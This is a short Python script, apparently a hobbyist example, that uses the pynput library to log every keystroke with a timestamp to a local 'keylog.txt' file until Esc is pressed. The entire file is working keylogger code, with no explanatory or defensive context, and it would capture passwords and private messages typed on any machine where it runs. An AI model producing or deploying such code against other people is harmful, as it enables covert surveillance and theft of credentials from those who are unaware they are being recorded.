#Vanilla python module
import logging
#'External' library
from pynput.keyboard import Key, Listener

#Log directory
log_dir=""

logging.basicConfig(filename=(log_dir + "keylog.txt"), level=logging.DEBUG, format='%(asctime)s : %(message)s:' )

def on_press(key):
	logging.info(str(key))
	if key == Key.esc:
		return False

with Listener(on_press=on_press) as listener:
	listener.join()
